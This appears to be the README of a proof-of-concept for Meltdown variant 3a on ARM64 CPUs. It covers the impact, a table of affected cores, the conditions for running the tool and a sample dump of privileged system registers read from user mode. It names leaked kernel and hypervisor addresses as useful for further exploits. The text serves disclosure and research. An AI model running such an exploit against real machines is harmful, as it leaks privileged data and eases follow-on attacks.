PoC code implementing variant 3a of the Meltdown attack for AArch64. This allows reading all (potentially excluding registers whose read has side effects - not verified) system registers from user mode, including those which should only be accessible from the EL1 (kernel), EL2 (hypervisor) and EL3 (secure monitor) modes.

See the [ARM whitepaper](https://developer.arm.com/support/security-update) and the [Meltdown vulnerability](https://spectreattack.com/).

Confirmed to be working on Cortex-A57 and Cortex-A72.


Impact
------

Infoleaks of potentially sensitive data from the OS, hypervisor or secure monitor. No cryptographic keys or user data are expected to be exposed in most cases. So far, I've identified 3 potentially interesting uses for this:

1) confirming the presence of a hypervisor and/or secure monitor on the machine
2) detecting the use of hardware debugging or profiling tools
3) obtaining valid addresses of software running in EL1-EL3 (from the registers containing pointers to the page tables, the exception vector, etc) - potentially useful in developing or deploying exploits for other vulnerabilities in this software


Affected implementations
------------------------

Only showing AArch64 implementations.

| Core             | Vulnerable according to vendor                           | Tested with this exploit |
|------------------|----------------------------------------------------------|--------------------------|
| ARM Cortex-A35   | [no](https://developer.arm.com/support/security-update)  | no                       |
| ARM Cortex-A53   | [no](https://developer.arm.com/support/security-update)  | yes, not vulnerable      |
| ARM Cortex-A57   | [yes](https://developer.arm.com/support/security-update) | yes, vulnerable          |
| ARM Cortex-A72   | [yes](https://developer.arm.com/support/security-update) | yes, vulnerable          |
| ARM Cortex-A73   | [no](https://developer.arm.com/support/security-update)  | no                       |
| ARM Cortex-A75   | [no](https://developer.arm.com/support/security-update)  | no                       |
| APM X-Gene 2     | N/A                                                      | yes, not vulnerable      |
| Cavium ThunderX2 | no                                                       | yes, not vulnerable      |
| Qualcomm Kryo (Snapdragon 820) | N/A                                        | yes, not vulnerable      |

Please open a pull request if you've tested on any other implementations.


Running it
----------

The access timing is done using a second thread which increments a counter, which means that at least 2 cores need to be online and (close to) idle. DVFS might have to be disabled. In a big.LITTLE system, pin this process to the big cores. Cortex-A57 and Cortex-A72 are the only AArch64-capable cores designed by ARM which are vulnerable (to this variant of Meltdown). Note that bit-level errors are possible, although they should be rare.


Sample output
-------------

The registers marked *dynamic* denote the registers which do not appear to have a constant value during the sampling process. In the sample below, these are the *Generic Timer* registers (CNT\*) and the *Interrupt Status Register* (ISR_EL1).

```
$ ./dump_sys_regs
ACTLR_EL1           : 0x0 
ACTLR_EL2           : 0x73 
ACTLR_EL3           : 0x73 
AIDR_EL1            : 0x0 
AFSR0_EL1           : 0x0 
AFSR0_EL2           : 0x0 
AFSR0_EL3           : 0x0 
AFSR1_EL1           : 0x0 
AFSR1_EL2           : 0x0 
AFSR1_EL3           : 0x0 
AMAIR_EL1           : 0x0 
AMAIR_EL2           : 0x0 
AMAIR_EL3           : 0x0 
CCSIDR_EL1          : 0x70ffe07a 
CLIDR_EL1           : 0xa200023 
CPACR_EL1           : 0x300000 
CPTR_EL2            : 0x33ff 
CPTR_EL3            : 0x0 
CSSELR_EL1          : 0x2 
CTR_EL0             : 0x8444c004 
DISR_EL1            : 0x0 
ERRIDR_EL1          : 0x0 
ERRSELR_EL1         : 0x0 
ERXADDR_EL1         : 0x0 
ERXCTLR_EL1         : 0x0 
ERXFR_EL1           : 0x0 
ERXMISC0_EL1        : 0x0 
ERXMISC1_EL1        : 0x0 
ERXSTATUS_EL1       : 0x0 
ESR_EL1             : 0x56000000 
ESR_EL2             : 0x0 
ESR_EL3             : 0x5e000000 
HACR_EL2            : 0x0 
HCR_EL2             : 0x80000000 
ID_AFR0_EL1         : 0x0 
ID_DFR0_EL1         : 0x3010066 
ID_ISAR0_EL1        : 0x2101110 
ID_ISAR1_EL1        : 0x13112111 
ID_ISAR2_EL1        : 0x21232042 
ID_ISAR3_EL1        : 0x1112131 
ID_ISAR4_EL1        : 0x11142 
ID_ISAR5_EL1        : 0x11121 
ID_ISAR6_EL1        : 0x0 
ID_MMFR0_EL1        : 0x10201105 
ID_MMFR1_EL1        : 0x40000000 
ID_MMFR2_EL1        : 0x1260000 
ID_MMFR3_EL1        : 0x2102211 
ID_MMFR4_EL1        : 0x0 
ID_PFR0_EL1         : 0x131 
ID_PFR1_EL1         : 0x11011 
ID_AA64DFR0_EL1     : 0x10305106 
ID_AA64ISAR0_EL1    : 0x11120 
ID_AA64ISAR1_EL1    : 0x0 
ID_AA64MMFR0_EL1    : 0x1124 
ID_AA64MMFR1_EL1    : 0x0 
ID_AA64MMFR2_EL1    : 0x0 
ID_AA64PFR0_EL1     : 0x2222 
IFSR32_EL2          : 0x0 
LORC_EL1            : 0x0 
LORID_EL1           : 0x0 
LORN_EL1            : 0x0 
MDCR_EL3            : 0x0 
MIDR_EL1            : 0x411fd073 
MPIDR_EL1           : 0x80000103 
PAR_EL1             : 0x7f99305000 
RVBAR_EL3           : 0xf6000000 
REVIDR_EL1          : 0x0 
SCTLR_EL1           : 0x34d5d91d 
SCTLR_EL3           : 0xcd183f 
TCR_EL1             : 0x34b5193519 
TCR_EL2             : 0x80800000 
TCR_EL3             : 0x8080351d 
TTBR0_EL1           : 0xf89f0000d4454000 
TTBR0_EL2           : 0x0 
TTBR0_EL3           : 0x30010b00 
TTBR1_EL1           : 0x8133f000 
TTBR1_EL2           : 0x0 
VDISR_EL2           : 0x0 
VSESR_EL2           : 0x0 
VTCR_EL2            : 0x80000000 
VTTBR_EL2           : 0x0 
AFSR0_EL12          : 0x0 
AFSR1_EL12          : 0x0 
AMAIR_EL12          : 0x0 
CNTFRQ_EL0          : 0x1dcd650 
CNTHCTL_EL2         : 0x3 
CNTHP_CTL_EL2       : 0x0 
CNTHP_CVAL_EL2      : 0x0 
CNTHP_TVAL_EL2      : 0x65a29ee7 (dynamic?)
CNTHV_CTL_EL2       : 0x0 
CNTHV_CVAL_EL2      : 0x0 
CNTHV_TVAL_EL2      : 0x0 
CNTKCTL_EL1         : 0xc6 
CNTKCTL_EL12        : 0x0 
CNTP_CTL_EL0        : 0x0 
CNTP_CTL_EL02       : 0x0 
CNTP_CVAL_EL0       : 0x12878de2 
CNTP_CVAL_EL02      : 0x0 
CNTP_TVAL_EL0       : 0x7801a980 (dynamic?)
CNTP_TVAL_EL02      : 0x0 
CNTPCT_EL0          : 0x162db9aa576c0 (dynamic?)
CNTPS_CTL_EL1       : 0x0 
CNTPS_CVAL_EL1      : 0x0 
CNTPS_TVAL_EL1      : 0x6539bd20 (dynamic?)
CNTV_CTL_EL0        : 0x0 
CNTV_CTL_EL02       : 0x0 
CNTV_CVAL_EL0       : 0x0 
CNTV_CVAL_EL02      : 0x0 
CNTV_TVAL_EL0       : 0x6516d1c0 (dynamic?)
CNTV_TVAL_EL02      : 0x0 
CNTVCT_EL0          : 0x162db9b090480 (dynamic?)
CNTVOFF_EL2         : 0x0 
CONTEXTIDR_EL1      : 0x0 
CONTEXTIDR_EL12     : 0x0 
CONTEXTIDR_EL2      : 0x0 
CPACR_EL12          : 0x0 
CPTR_EL3            : 0x0 
DACR32_EL2          : 0x0 
ESR_EL12            : 0x0 
FAR_EL1             : 0x0 
FAR_EL12            : 0x0 
FAR_EL2             : 0x0 
FAR_EL3             : 0x0 
FPEXC32_EL2         : 0x7f99305000 
HPFAR_EL2           : 0x0 
HSTR_EL2            : 0x0 
ID_AA64AFR0_EL1     : 0x0 
ID_AA64AFR1_EL1     : 0x0 
ID_AA64DFR1_EL1     : 0x0 
ID_AA64PFR1_EL1     : 0x0 
ISR_EL1             : 0x0 (dynamic?)
LOREA_EL1           : 0x0 
LORSA_EL1           : 0x0 
MAIR_EL1            : 0xbbff440c0400 
MAIR_EL12           : 0x0 
MAIR_EL2            : 0x0 
MAIR_EL3            : 0x4404ff 
MDCR_EL2            : 0x6 
MVFR0_EL1           : 0x10110222 
MVFR1_EL1           : 0x12111111 
MVFR2_EL1           : 0x43 
RMR_EL3             : 0x1 
SCR_EL3             : 0x535 
SCTLR_EL12          : 0x0 
SCTLR_EL2           : 0x30c50830 
SDER32_EL3          : 0x0 
TCR_EL12            : 0x0 
TPIDR_EL0           : 0x7f993066f0 
TPIDR_EL1           : 0x1fed81000 
TPIDR_EL2           : 0x0 
TPIDR_EL3           : 0x30010f80 
TPIDRRO_EL0         : 0x0 
TTBR0_EL12          : 0x0 
TTBR1_EL12          : 0x0 
VBAR_EL1            : 0xffffffc000083800 
VBAR_EL12           : 0x0 
VBAR_EL2            : 0x8008a000 
VBAR_EL3            : 0x3000a800 
VMPIDR_EL2          : 0x80000103 
VPIDR_EL2           : 0x411fd073
```
